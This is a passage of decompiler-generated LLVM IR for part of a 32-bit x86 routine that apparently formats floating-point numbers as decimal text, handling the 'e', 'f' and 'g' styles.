  br label %dec_label_pc_8054e0d

bb184:                                            ; preds = %bb183
  %not.v6_8054df7 = fcmp une x86_fp80 %v3_8054def, %v1_8054dfd
  store x86_fp80 %v3_8054def, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_8054df7, label %dec_label_pc_8054e0d, label %dec_label_pc_8054dfd

dec_label_pc_8054dfd:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_8054def, x86_fp80* %st1.global-to-local, align 4
  %v5_8054e07 = add i32 %stack_var_-220.0, %v0_8054e13
  br label %dec_label_pc_8054e0f

dec_label_pc_8054e0d:                             ; preds = %dec_label_pc_8054dc9, %.thread51, %bb184
  %v1_8054e0d = phi x86_fp80 [ %v1_8054dfd, %.thread51 ], [ %v1_8054dfd, %bb184 ], [ %v3_8054dce, %dec_label_pc_8054dc9 ]
  %v0_8054dc280 = phi x86_fp80 [ %v3_8054def, %.thread51 ], [ %v3_8054def, %bb184 ], [ %v4_8054dd4, %dec_label_pc_8054dc9 ]
  store x86_fp80 %v1_8054e0d, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054e0f

dec_label_pc_8054e0f:                             ; preds = %dec_label_pc_8054dfd, %dec_label_pc_8054ddc, %dec_label_pc_8054e0d
  %v2_8054dc581 = phi x86_fp80 [ %v1_8054e0d, %dec_label_pc_8054e0d ], [ %v2_8054dc5, %dec_label_pc_8054dfd ], [ %v1_8054dfd, %dec_label_pc_8054ddc ]
  %v0_8054dc279 = phi x86_fp80 [ %v0_8054dc280, %dec_label_pc_8054e0d ], [ %v3_8054def, %dec_label_pc_8054dfd ], [ %v4_8054dd4, %dec_label_pc_8054ddc ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_8054e0d ], [ %v5_8054e07, %dec_label_pc_8054dfd ], [ %v5_8054de6, %dec_label_pc_8054ddc ]
  %v1_8054e0f = icmp eq i32 %v1_8054dc4, 0
  br i1 %v1_8054e0f, label %.thread60, label %dec_label_pc_8054e13

dec_label_pc_8054e13:                             ; preds = %dec_label_pc_8054e0f
  %v2_8054e13 = sdiv i32 %v0_8054e13, 2
  store i32 %v2_8054e13, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054dc2

.thread60:                                        ; preds = %dec_label_pc_8054e0f
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8054e37

dec_label_pc_8054e37:                             ; preds = %dec_label_pc_8054d1a, %.thread60
  %v0_8054ef1 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_8054d1a ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_8054d1a ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_8054e3b = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8054d12, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8054e4e = and i32 %v2_8054e3b, -65536
  %v1_8054e53 = udiv i16 %tmp146, 256
  %v2_8054e53 = zext i16 %v1_8054e53 to i32
  %v3_8054e53 = or i32 %v2_8054e53, 12
  %v10_8054e53 = mul nuw nsw i32 %v3_8054e53, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_8054e4e.masked = zext i16 %tmp194 to i32
  %v11_8054e53 = or i32 %v10_8054e53, %v4_8054e4e.masked
  %v12_8054e53 = or i32 %v11_8054e53, %v6_8054e4e
  store i32 %v12_8054e53, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054e5b

dec_label_pc_8054e5b:                             ; preds = %dec_label_pc_8054ead.dec_label_pc_8054e5b_crit_edge, %dec_label_pc_8054e37
  %v2_8054e80 = phi x86_fp80 [ %storemerge, %dec_label_pc_8054e37 ], [ %v2_8054e80.pre, %dec_label_pc_8054ead.dec_label_pc_8054e5b_crit_edge ]
  %v1_8054e5b = phi i3 [ %v1_8054d12, %dec_label_pc_8054e37 ], [ %v1_8054e5b.pre, %dec_label_pc_8054ead.dec_label_pc_8054e5b_crit_edge ]
  %v3_8054e82 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8054e37 ], [ %v0_8054e5b.pre, %dec_label_pc_8054ead.dec_label_pc_8054e5b_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8054e3b, %dec_label_pc_8054e37 ], [ %v4_8054e7b, %dec_label_pc_8054ead.dec_label_pc_8054e5b_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_8054e82 to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_8054e75 = sitofp i32 %tmp195 to x86_fp80
  %v4_8054e7b = add i32 %stack_var_-212.0, 9
  %v4_8054e80 = fsub x86_fp80 %v2_8054e80, %v5_8054e75
  store i3 %v1_8054e5b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054e82 = fmul x86_fp80 %v3_8054e82, %v4_8054e80
  store x86_fp80 %v4_8054e82, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054e84

dec_label_pc_8054e84:                             ; preds = %dec_label_pc_8054e84.dec_label_pc_8054e84_crit_edge, %dec_label_pc_8054e5b
  %v0_8054e98 = phi i32 [ %v0_8054e98.pre, %dec_label_pc_8054e84.dec_label_pc_8054e84_crit_edge ], [ %tmp195, %dec_label_pc_8054e5b ]
  %v0_8054e88 = phi i32 [ %v0_8054e88.pre, %dec_label_pc_8054e84.dec_label_pc_8054e84_crit_edge ], [ 0, %dec_label_pc_8054e5b ]
  %v1_8054e88 = add i32 %v0_8054e88, 1
  store i32 %v1_8054e88, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8054e92 = sub i32 %v4_8054e7b, %v1_8054e88
  %div = udiv i32 %v0_8054e98, 10
  %tmp185 = urem i32 %v0_8054e98, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8054e9e = and i32 %div, 536870656
  store i32 %v2_8054e92, i32* %edx.global-to-local, align 4
  %v1_8054ea4 = trunc i32 %tmp185 to i8
  %v2_8054ea4 = or i8 %v1_8054ea4, 48
  %v12_8054ea4 = zext i8 %v2_8054ea4 to i32
  %v15_8054ea4 = or i32 %v12_8054ea4, %v3_8054e9e
  store i32 %v15_8054ea4, i32* %eax.global-to-local, align 4
  %v3_8054ea9 = inttoptr i32 %v2_8054e92 to i8*
  store i8 %v2_8054ea4, i8* %v3_8054ea9, align 1
  %v7_8054eab = icmp sgt i32 %v1_8054e88, 8
  br i1 %v7_8054eab, label %dec_label_pc_8054ead, label %dec_label_pc_8054e84.dec_label_pc_8054e84_crit_edge

dec_label_pc_8054e84.dec_label_pc_8054e84_crit_edge: ; preds = %dec_label_pc_8054e84
  %v0_8054e88.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8054e98.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054e84

dec_label_pc_8054ead:                             ; preds = %dec_label_pc_8054e84
  %v0_8054ead = load i32, i32* @edi, align 4
  %v1_8054ead = add i32 %v0_8054ead, 1
  store i32 %v1_8054ead, i32* @edi, align 4
  %v7_8054eb1 = icmp sgt i32 %v1_8054ead, 2
  br i1 %v7_8054eb1, label %dec_label_pc_8054eb3, label %dec_label_pc_8054ead.dec_label_pc_8054e5b_crit_edge

dec_label_pc_8054ead.dec_label_pc_8054e5b_crit_edge: ; preds = %dec_label_pc_8054ead
  %v0_8054e5b.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8054e5b.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8054e80.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054e5b

dec_label_pc_8054eb3:                             ; preds = %dec_label_pc_8054ead
  %v0_8054eb3 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054eb3 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8054eb3, x86_fp80* %st0.global-to-local, align 4
  %v2_8054eb5 = add i3 %v0_8054eb3, 2
  store i3 %v2_8054eb5, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054eb7 = add i8 %stack_var_-207.0, -96
  %v6_8054eb7 = sub i8 95, %stack_var_-207.0
  %v7_8054eb7 = and i8 %v6_8054eb7, %stack_var_-207.0
  %v8_8054eb7 = icmp slt i8 %v7_8054eb7, 0
  %v9_8054eb7 = icmp eq i8 %v4_8054eb7, 0
  %v10_8054eb7 = icmp slt i8 %v4_8054eb7, 0
  %v3_8054ebc = icmp eq i1 %v10_8054eb7, %v8_8054eb7
  %v4_8054ebc = icmp eq i1 %v9_8054eb7, false
  %v5_8054ebc = and i1 %v4_8054ebc, %v3_8054ebc
  br i1 %v5_8054ebc, label %dec_label_pc_8054ecb, label %dec_label_pc_8054ebe

dec_label_pc_8054ebe:                             ; preds = %dec_label_pc_8054eb3
  %v4_8054ebe = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_8054ecb

dec_label_pc_8054ecb:                             ; preds = %dec_label_pc_8054eb3, %dec_label_pc_8054ebe
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_8054eb3 ], [ %v4_8054ebe, %dec_label_pc_8054ebe ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8054eb3 ], [ 69, %dec_label_pc_8054ebe ]
  %v12_8054ecb = icmp eq i8 %stack_var_-207.1, 103
  %v1_8054ed0 = icmp eq i1 %v12_8054ecb, false
  br i1 %v1_8054ed0, label %dec_label_pc_8054ed9, label %dec_label_pc_8054ed2

dec_label_pc_8054ed2:                             ; preds = %dec_label_pc_8054ecb
  %v0_8054ed2 = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_8054ed2, 1
  br i1 %tmp186, label %dec_label_pc_8054ee0, label %dec_label_pc_8054ed6

dec_label_pc_8054ed6:                             ; preds = %dec_label_pc_8054ed2
  %v1_8054ed6 = add i32 %v0_8054ed2, -1
  store i32 %v1_8054ed6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054ee0

dec_label_pc_8054ed9:                             ; preds = %dec_label_pc_8054ecb
  %v12_8054ed9 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_8054ed9, label %dec_label_pc_8054ee4, label %dec_label_pc_8054ed9.dec_label_pc_8054ee0_crit_edge

dec_label_pc_8054ed9.dec_label_pc_8054ee0_crit_edge: ; preds = %dec_label_pc_8054ed9
  %v0_8054ee0.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054ee0

dec_label_pc_8054ee0:                             ; preds = %dec_label_pc_8054ed9.dec_label_pc_8054ee0_crit_edge, %dec_label_pc_8054ed2, %dec_label_pc_8054ed6
  %v0_8054ee0 = phi i32 [ %v0_8054ee0.pre, %dec_label_pc_8054ed9.dec_label_pc_8054ee0_crit_edge ], [ %v0_8054ed2, %dec_label_pc_8054ed2 ], [ %v1_8054ed6, %dec_label_pc_8054ed6 ]
  store i32 %v0_8054ee0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f11

dec_label_pc_8054ee4:                             ; preds = %dec_label_pc_8054ed9
  store i32 %v0_8054ef1, i32* %eax.global-to-local, align 4
  %v0_8054ee8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054ee8 = add i32 %v0_8054ee8, %v0_8054ef1
  store i32 %v2_8054ee8, i32* %ebx.global-to-local, align 4
  %v5_8054eef = icmp slt i32 %v2_8054ee8, -1
  br i1 %v5_8054eef, label %dec_label_pc_8054ef1, label %dec_label_pc_8054f11

dec_label_pc_8054ef1:                             ; preds = %dec_label_pc_8054ee4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054ef9 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8054ef9, i32* %eax.global-to-local, align 4
  %v4_8054f01 = bitcast i32* %stack_var_-72 to i8*
  %v5_8054f01 = call i32 @__GI_memset(i8* %v4_8054f01, i32 48, i32 21)
  store i32 %v5_8054f01, i32* %eax.global-to-local, align 4
  %v0_8054f11.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f11

dec_label_pc_8054f11:                             ; preds = %dec_label_pc_8054ee4, %dec_label_pc_8054ef1, %dec_label_pc_8054ee0
  %v1_8054f31 = phi i32 [ %v0_8054ee0, %dec_label_pc_8054ee0 ], [ %v2_8054ee8, %dec_label_pc_8054ee4 ], [ %v0_8054f11.pr.pre, %dec_label_pc_8054ef1 ]
  %stack_var_-220.3 = phi i32 [ %v0_8054ef1, %dec_label_pc_8054ee0 ], [ %v0_8054ef1, %dec_label_pc_8054ee4 ], [ -1, %dec_label_pc_8054ef1 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8054f24 = icmp sgt i32 %v1_8054f31, 20
  br i1 %v7_8054f24, label %dec_label_pc_8054f26, label %dec_label_pc_8054f31

dec_label_pc_8054f26:                             ; preds = %dec_label_pc_8054f11
  %v2_8054f26 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8054f26, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054f45.preheader

dec_label_pc_8054f31:                             ; preds = %dec_label_pc_8054f11
  %v0_8054f31 = load i32, i32* @esp, align 4
  %v2_8054f31 = add i32 %v1_8054f31, 165
  %v3_8054f31 = add i32 %v2_8054f31, %v0_8054f31
  store i32 %v3_8054f31, i32* %eax.global-to-local, align 4
  %v1_8054f38 = add i32 %v3_8054f31, 2
  %v2_8054f38 = inttoptr i32 %v1_8054f38 to i8*
  %v3_8054f38 = load i8, i8* %v2_8054f38, align 1
  %v4_8054f38 = add i8 %v3_8054f38, -53
  %v9_8054f38 = sub i8 52, %v3_8054f38
  %v10_8054f38 = and i8 %v9_8054f38, %v3_8054f38
  %v11_8054f38 = icmp slt i8 %v10_8054f38, 0
  %v13_8054f38 = icmp slt i8 %v4_8054f38, 0
  store i32 %v1_8054f38, i32* %ecx.global-to-local, align 4
  %v2_8054f3f = icmp eq i1 %v13_8054f38, %v11_8054f38
  %v3_8054f3f = zext i1 %v2_8054f3f to i32
  br label %dec_label_pc_8054f45.preheader

dec_label_pc_8054f45.preheader:                   ; preds = %dec_label_pc_8054f31, %dec_label_pc_8054f26
  %v0_8054f45102 = phi i32 [ %v1_8054f38, %dec_label_pc_8054f31 ], [ %v2_8054f26, %dec_label_pc_8054f26 ]
  %storemerge71 = phi i32 [ %v3_8054f3f, %dec_label_pc_8054f31 ], [ 0, %dec_label_pc_8054f26 ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054f45

dec_label_pc_8054f45:                             ; preds = %dec_label_pc_8054f45.backedge, %dec_label_pc_8054f45.preheader
  %v3_8054f46 = phi i32 [ %v3_8054f46.pre, %dec_label_pc_8054f45.backedge ], [ %storemerge71, %dec_label_pc_8054f45.preheader ]
  %v0_8054f45 = phi i32 [ %v0_8054f48, %dec_label_pc_8054f45.backedge ], [ %v0_8054f45102, %dec_label_pc_8054f45.preheader ]
  %v1_8054f45 = add i32 %v0_8054f45, -1
  store i32 %v1_8054f45, i32* %ecx.global-to-local, align 4
  %v1_8054f46 = inttoptr i32 %v1_8054f45 to i8*
  %v2_8054f46 = load i8, i8* %v1_8054f46, align 1
  %v4_8054f46 = trunc i32 %v3_8054f46 to i8
  %v5_8054f46 = add i8 %v2_8054f46, %v4_8054f46
  store i8 %v5_8054f46, i8* %v1_8054f46, align 1
  %v0_8054f48 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054f48 = inttoptr i32 %v0_8054f48 to i8*
  %v2_8054f48 = load i8, i8* %v1_8054f48, align 1
  %v3_8054f48 = zext i8 %v2_8054f48 to i32
  %v4_8054f48 = load i32, i32* %edx.global-to-local, align 4
  %v5_8054f48 = and i32 %v4_8054f48, -256
  %v6_8054f48 = or i32 %v5_8054f48, %v3_8054f48
  store i32 %v6_8054f48, i32* %edx.global-to-local, align 4
  %v7_8054f4a = icmp eq i8 %v2_8054f48, 48
  br i1 %v7_8054f4a, label %dec_label_pc_8054f45.backedge, label %dec_label_pc_8054f4f

dec_label_pc_8054f45.backedge:                    ; preds = %dec_label_pc_8054f45, %dec_label_pc_8054f4f
  %v3_8054f46.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054f45

dec_label_pc_8054f4f:                             ; preds = %dec_label_pc_8054f45
  %v2_8054f4f = add i8 %v2_8054f48, -57
  %v7_8054f4f = sub i8 56, %v2_8054f48
  %v8_8054f4f = and i8 %v7_8054f4f, %v2_8054f48
  %v9_8054f4f = icmp slt i8 %v8_8054f4f, 0
  %v10_8054f4f = icmp eq i8 %v2_8054f4f, 0
  %v11_8054f4f = icmp slt i8 %v2_8054f4f, 0
  %v3_8054f52 = icmp eq i1 %v11_8054f4f, %v9_8054f4f
  %v4_8054f52 = icmp eq i1 %v10_8054f4f, false
  %v5_8054f52 = and i1 %v4_8054f52, %v3_8054f52
  br i1 %v5_8054f52, label %dec_label_pc_8054f45.backedge, label %dec_label_pc_8054f54

dec_label_pc_8054f54:                             ; preds = %dec_label_pc_8054f4f
  %v2_8054f54 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8054f54, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8054f48, %v2_8054f54
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_8054f5f, label %dec_label_pc_8054f6c

dec_label_pc_8054f5f:                             ; preds = %dec_label_pc_8054f54
  store i32 %v2_8054e3b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054f75

dec_label_pc_8054f6c:                             ; preds = %dec_label_pc_8054f54
  store i32 %v2_8054f54, i32* %edx.global-to-local, align 4
  store i32 %v2_8054f54, i32* %ecx.global-to-local, align 4
  %v1_8054f74 = add i32 %stack_var_-220.3, 1
  store i32 %v1_8054f74, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054f75

dec_label_pc_8054f75:                             ; preds = %dec_label_pc_8054f5f, %dec_label_pc_8054f6c
  %v0_8054f75 = phi i32 [ %v0_8054f48, %dec_label_pc_8054f5f ], [ %v2_8054f54, %dec_label_pc_8054f6c ]
  %v1_8054f75 = add i32 %v0_8054f75, 1
  store i32 %v1_8054f75, i32* %eax.global-to-local, align 4
  %v2_8054f7c = inttoptr i32 %v1_8054f75 to i8*
  store i8 0, i8* %v2_8054f7c, align 1
  br i1 %v1_8054ed0, label %dec_label_pc_8054fa2, label %dec_label_pc_8054f87

dec_label_pc_8054f87:                             ; preds = %dec_label_pc_8054f75
  %v0_8054f87 = load i32, i32* %esi.global-to-local, align 4
  %v5_8054f8a = icmp slt i32 %v0_8054f87, -4
  br i1 %v5_8054f8a, label %dec_label_pc_8054faf, label %dec_label_pc_8054f8c

dec_label_pc_8054f8c:                             ; preds = %dec_label_pc_8054f87
  %v1_8054f8c = load i32, i32* %ebx.global-to-local, align 4
  %v7_8054f8e = icmp slt i32 %v1_8054f8c, %v0_8054f87
  br i1 %v7_8054f8e, label %dec_label_pc_8054faf, label %dec_label_pc_8054f97

dec_label_pc_8054f97:                             ; preds = %dec_label_pc_8054f8c
  %v2_8054f99 = sub i32 %v1_8054f8c, %v0_8054f87
  store i32 %v2_8054f99, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054fb3

dec_label_pc_8054fa2:                             ; preds = %dec_label_pc_8054f75
  %v4_8054fa2 = zext i8 %stack_var_-207.1 to i32
  %v5_8054fa2 = load i32, i32* %ebx.global-to-local, align 4
  %v6_8054fa2 = and i32 %v5_8054fa2, -256
  %v7_8054fa2 = or i32 %v6_8054fa2, %v4_8054fa2
  store i32 %v7_8054fa2, i32* %ebx.global-to-local, align 4
  %v10_8054fa6 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8054fa6, label %dec_label_pc_8054fa2.dec_label_pc_8054fb3_crit_edge, label %dec_label_pc_8054faf

dec_label_pc_8054fa2.dec_label_pc_8054fb3_crit_edge: ; preds = %dec_label_pc_8054fa2
  %v0_8054fb3.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054fb3

dec_label_pc_8054faf:                             ; preds = %dec_label_pc_8054f87, %dec_label_pc_8054f8c, %dec_label_pc_8054fa2
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8054fa2 ], [ 103, %dec_label_pc_8054f8c ], [ 103, %dec_label_pc_8054f87 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054fbd

dec_label_pc_8054fb3:                             ; preds = %dec_label_pc_8054fa2.dec_label_pc_8054fb3_crit_edge, %dec_label_pc_8054f97
  %v0_8054fb5 = phi i32 [ %v0_8054fb3.pre, %dec_label_pc_8054fa2.dec_label_pc_8054fb3_crit_edge ], [ %v0_8054f87, %dec_label_pc_8054f97 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8054fa2.dec_label_pc_8054fb3_crit_edge ], [ 102, %dec_label_pc_8054f97 ]
  %v2_8054fb3 = icmp slt i32 %v0_8054fb5, 0
  store i32 %v0_8054fb5, i32* %ebx.global-to-local, align 4
  %v1_8054fb7 = icmp eq i1 %v2_8054fb3, false
  br i1 %v1_8054fb7, label %dec_label_pc_8054fbd, label %dec_label_pc_8054fb9

dec_label_pc_8054fb9:                             ; preds = %dec_label_pc_8054fb3
  %v0_8054fb9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054fb9 = add i32 %v0_8054fb9, -1
  store i32 %v1_8054fb9, i32* %edx.global-to-local, align 4
  %v1_8054fba = inttoptr i32 %v1_8054fb9 to i8*
  store i8 48, i8* %v1_8054fba, align 1
  %v0_8054ff2.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054fbd

dec_label_pc_8054fbd:                             ; preds = %dec_label_pc_8054fb3, %dec_label_pc_8054faf, %dec_label_pc_8054fb9
  %v1_805504d = phi i32 [ %v0_8054fb5, %dec_label_pc_8054fb3 ], [ %v0_8054ff2.pre, %dec_label_pc_8054fb9 ], [ 0, %dec_label_pc_8054faf ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_8054fb3 ], [ %stack_var_-197.1, %dec_label_pc_8054fb9 ], [ %stack_var_-197.0, %dec_label_pc_8054faf ]
  %v2_8054fbd = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8054fbd, i32* %eax.global-to-local, align 4
  %v0_8054fcc = load i32, i32* %edx.global-to-local, align 4
  %v1_8054fcc = add i32 %v0_8054fcc, 1
  store i32 %v1_8054fcc, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_8054fdb = inttoptr i32 %v0_8054fcc to i8*
  %v2_8054fdb = load i8, i8* %v1_8054fdb, align 1
  %v3_8054fdb = zext i8 %v2_8054fdb to i32
  %v5_8054fdb = and i32 %v2_8054fbd, -256
  %v6_8054fdb = or i32 %v3_8054fdb, %v5_8054fdb
  store i32 %v6_8054fdb, i32* %eax.global-to-local, align 4
  store i32 %v6_8054fdb, i32* %stack_var_-22, align 4
  %v2_8054ff0 = sub i32 %v1_8054f75, %v1_8054fcc
  store i32 %v2_8054ff0, i32* %edx.global-to-local, align 4
  %v1_8054ff2 = icmp eq i32 %v1_805504d, 0
  %v2_8054ff2 = icmp slt i32 %v1_805504d, 0
  br i1 %v2_8054ff2, label %dec_label_pc_8055041, label %dec_label_pc_8054ff6

dec_label_pc_8054ff6:                             ; preds = %dec_label_pc_8054fbd
  %v2_8054ff6 = sub i32 %v1_805504d, %v2_8054ff0
  %v8_8054ff6 = xor i32 %v2_8054ff0, %v1_805504d
  %v9_8054ff6 = xor i32 %v2_8054ff6, %v1_805504d
  %v10_8054ff6 = and i32 %v9_8054ff6, %v8_8054ff6
  %v11_8054ff6 = icmp slt i32 %v10_8054ff6, 0
  %v13_8054ff6 = icmp slt i32 %v2_8054ff6, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8055004 = icmp eq i1 %v13_8054ff6, %v11_8054ff6
  br i1 %v2_8055004, label %dec_label_pc_8055006, label %dec_label_pc_805503a

dec_label_pc_8055006:                             ; preds = %dec_label_pc_8054ff6
  store i32 %v2_8054ff6, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_8054ff6, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_805501b, label %dec_label_pc_8055036

dec_label_pc_805501b:                             ; preds = %dec_label_pc_8055006
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8055036

dec_label_pc_8055036:                             ; preds = %dec_label_pc_8055006, %dec_label_pc_805501b
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_805501b ], [ %stack_var_-132, %dec_label_pc_8055006 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055056

dec_label_pc_805503a:                             ; preds = %dec_label_pc_8054ff6
  %v4_805503c = icmp eq i1 %v1_8054ff2, false
  br i1 %v4_805503c, label %dec_label_pc_8055047, label %dec_label_pc_805503e

dec_label_pc_805503e:                             ; preds = %dec_label_pc_805503a
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055041

dec_label_pc_8055041:                             ; preds = %dec_label_pc_8054fbd, %dec_label_pc_805503e
  %v0_8055089112 = phi i32 [ %v1_805504d, %dec_label_pc_8054fbd ], [ -1, %dec_label_pc_805503e ]
  %v2_8055041 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8055041, i32* @ecx, align 4
  br label %dec_label_pc_8055056

dec_label_pc_8055047:                             ; preds = %dec_label_pc_805503a
  %v2_805504b = add i32 %v1_8054fcc, %v1_805504d
  store i32 %v2_805504b, i32* %edi.global-to-local, align 4
  %v2_805504d = sub i32 %v2_8054ff0, %v1_805504d
  store i32 %v2_805504d, i32* %edx.global-to-local, align 4
  %v2_805504f = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805504f, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055056

dec_label_pc_8055056:                             ; preds = %dec_label_pc_8055041, %dec_label_pc_8055036, %dec_label_pc_8055047
  %v0_8055089111 = phi i32 [ %v0_8055089112, %dec_label_pc_8055041 ], [ -1, %dec_label_pc_8055036 ], [ -1, %dec_label_pc_8055047 ]
  %v0_8055072 = phi i32 [ %v2_8055041, %dec_label_pc_8055041 ], [ %storemerge28, %dec_label_pc_8055036 ], [ %v2_805504f, %dec_label_pc_8055047 ]
  %v0_8055063 = phi i32 [ %v2_8054ff0, %dec_label_pc_8055041 ], [ 0, %dec_label_pc_8055036 ], [ %v2_805504d, %dec_label_pc_8055047 ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_805505d = inttoptr i32 %v1_8054cd3 to i8*
  %v3_805505d = load i8, i8* %v2_805505d, align 1
  %v4_805505d = and i8 %v3_805505d, 16
  %v5_805505d = icmp eq i8 %v4_805505d, 0
  %v1_8055061 = icmp eq i1 %v5_805505d, false
  br i1 %v1_8055061, label %dec_label_pc_8055072, label %dec_label_pc_8055063

dec_label_pc_8055063:                             ; preds = %dec_label_pc_8055056
  %v1_8055063 = icmp eq i32 %v0_8055063, 0
  %v1_8055065 = icmp eq i1 %v1_8055063, false
  br i1 %v1_8055065, label %dec_label_pc_8055072, label %dec_label_pc_8055067

dec_label_pc_8055067:                             ; preds = %dec_label_pc_8055063
  br i1 %v12_8054ecb, label %dec_label_pc_8055089, label %dec_label_pc_805506e

dec_label_pc_805506e:                             ; preds = %dec_label_pc_8055067
  %v0_805506e = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_805506e, 1
  br i1 %tmp189, label %dec_label_pc_8055089, label %dec_label_pc_8055072

dec_label_pc_8055072:                             ; preds = %dec_label_pc_805506e, %dec_label_pc_8055063, %dec_label_pc_8055056
  %v1_8055072 = inttoptr i32 %v0_8055072 to i32*
  store i32 112, i32* %v1_8055072, align 4
  %v0_8055078 = load i32, i32* @ecx, align 4
  %v1_8055078 = add i32 %v0_8055078, 4
  %v2_8055078 = inttoptr i32 %v1_8055078 to i32*
  store i32 1, i32* %v2_8055078, align 4
  %v0_805507f = load i32, i32* @ecx, align 4
  %v1_805507f = add i32 %v0_805507f, 8
  %v2_805507f = inttoptr i32 %v1_805507f to i32*
  store i32 ptrtoint (i32* @global_var_8061680.786 to i32), i32* %v2_805507f, align 4
  %v0_8055086 = load i32, i32* @ecx, align 4
  %v1_8055086 = add i32 %v0_8055086, 12
  store i32 %v1_8055086, i32* @ecx, align 4
  %v0_8055089.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055089

dec_label_pc_8055089:                             ; preds = %dec_label_pc_805506e, %dec_label_pc_8055067, %dec_label_pc_8055072
  %v0_8055090 = phi i32 [ %v0_8055072, %dec_label_pc_805506e ], [ %v0_8055072, %dec_label_pc_8055067 ], [ %v1_8055086, %dec_label_pc_8055072 ]
